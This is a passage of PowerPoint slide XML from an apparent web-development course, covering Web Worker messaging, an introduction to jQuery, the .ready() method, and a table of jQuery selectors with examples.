              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>e.data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</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worker.terminate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(); // kill worker</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false);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>worker.postMessage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>('Hello World'); /* Send data to our worker. */</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRP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 worker.js (the worker)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>self.addEventListener</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>('message', function(e) {</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self.postMessage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e.data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>); /* echoing the message back */</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}, false);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C49D81B3-BDA7-442C-A77C-A2AA285F6248}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>jQuery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="186371" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AE1C4187-A06C-4C03-9455-BF3615D04BA8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId3" tooltip="JavaScript library"/>
              </a:rPr>
              <a:t>JavaScript library</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> designed to simplify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId4" tooltip="HTML"/>
              </a:rPr>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId5" tooltip="Document Object Model"/>
              </a:rPr>
              <a:t>DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> tree traversal and manipulation, as well as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId6" tooltip="Event handling"/>
              </a:rPr>
              <a:t>event handling</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId7" tooltip="CSS animation"/>
              </a:rPr>
              <a:t>CSS animation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId8" tooltip="Ajax (programming)"/>
              </a:rPr>
              <a:t>Ajax</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Created originally in 2006 by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId9"/>
              </a:rPr>
              <a:t>John </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0" err="1">
                <a:hlinkClick r:id="rId9"/>
              </a:rPr>
              <a:t>Resig</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>According to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId10"/>
              </a:rPr>
              <a:t>W3Techs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> jQuery is used by 76.5 % of web sites. JavaScript library market share of 97.1%. Making it by far the most popular JavaScript library, followed by: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId11"/>
              </a:rPr>
              <a:t>bootstrap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> (21.2 %) and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0" err="1">
                <a:hlinkClick r:id="rId12"/>
              </a:rPr>
              <a:t>Modernizr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0"/>
              <a:t> (10.3 %).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>jQuery uses CSS3 selectors for find elements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>There</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>are thousands </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId13"/>
              </a:rPr>
              <a:t>plugins</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0" err="1"/>
              <a:t>jQuery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="28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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A82EE2B4-C8FF-4E02-BF99-F6365985CDD5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>jQuery ready</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="187395" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{06D677E7-0827-4F64-8E66-7CAD65621744}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>The .ready() method offers a way to run JavaScript code as soon as the page's Document Object Model (DOM) becomes safe to manipulate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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document</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ready</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".demo"</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click</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this</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>hide</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200</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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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Short form of Document Ready</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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3C7DE473-B4C7-4032-A8AA-A84AA174DC6B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>jQuery Selectors</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0F5B0F7C-10BE-4CAD-AB9E-946238777C3D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1447328585"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1295400"/>
          <a:ext cx="10972800" cy="5191130"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2174032">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="5141168">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70795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Selector</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Example</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>*</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>All elements</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$("*")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>#id</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>The element with id</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('#</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>myid</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>');</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.class</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>all elements with class</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('.error')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:first</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>first element</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>p:first</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:last</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>last</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>p:last</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:even</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>even</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>tr:even</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:odd</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>odd</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>tr:odd</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>parent descendant</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>all descendant elements from parent</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('#navbar li')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>element + next</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>all next which are next to element</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('h1+h2')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
